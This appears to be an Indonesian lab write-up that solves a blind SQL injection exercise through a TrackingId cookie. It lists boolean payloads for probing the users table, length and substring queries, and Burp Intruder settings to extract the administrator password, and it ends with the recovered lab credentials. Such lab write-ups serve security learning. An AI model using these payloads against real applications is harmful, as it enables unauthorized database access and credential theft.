# Overview
web app vuln terhadap BlindSQLI. Apps menggunakan cookie tracking untuk analisis dan melakukan SQL query yang berisi value dari kode yang disubmit.

Hint:
- Jika SQL query tidak return apa-apa, dan terdapat error display, query kita salah.
- Jika SQL query return "Welcome Back" message, maka dapat dipastikan bahwa query payload kita berhasil.
- db berisi tabel `users` dengan kolom `username` dan `password`

Goal:
- cari creds untuk user `administrator`
- login dengan creds yang didapat.

# Analisis
Cek jika app vuln terhadap SQLI dengan `' and '1'='1` pada cookie `TrackingId`

cek apakah kita memiliki tabel `users`. gunakan `' and (select 'x' from users LIMIT 1)='x'--'`
- hasilnya true

cek apakah kita memiliki username `Administrator` di tabel `users`. gunakan `' and (select username from users where username='administrator')='administrator'--'`
- hasilnya `administrator` ada

lakukan enumerasi password pada user `administrator`. 
`' and (select password from users where username='administrator')='administrator'--'` **TIDAK DISARANKAN KARENA SAMA DENGAN BRUTE FORCE**
- daripada itu, gunakan proses enumerasi manual
	- gunakan query berikut untuk menghitung total panjang password `' and (select username from users where username='administrator' and length(password)>1)='administrator'--'`
	- hasilnya password length adalah 20
lakukan enumerasi string pada password dengna menggunakan query berikut
`' and (select substring(password,1,1) from users where username='administrator')='a'--`. Melakukan manual akan memakan banyak waktu, maka lakukan di burpsuite dengan tambahkan request ke intruder, lalu add simbol `§` di 2 bagian seperti berikut `' and (select substring(password,§1§,1) from users where username='administrator')='§a§'--`, selanjutnya atur payload 1 menjadi `Numbers` dengan tipe `Sequential` dari 1 sampai 20 dengan step 1 serta number format decimal dan lainnya kosong, lalu payload 2 menjadi `Brute forcer` dengan min length 1 dan max length 1, lalu start attack.
hasilnya adalah
```
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
a x i y r t i 3 p 8  j  b  q  x  1  2  t  9  y  b
```
selanjutnya kita bisa login dengan creds tersebut `administrator:axiyrti3p8jbqx12t9yb`

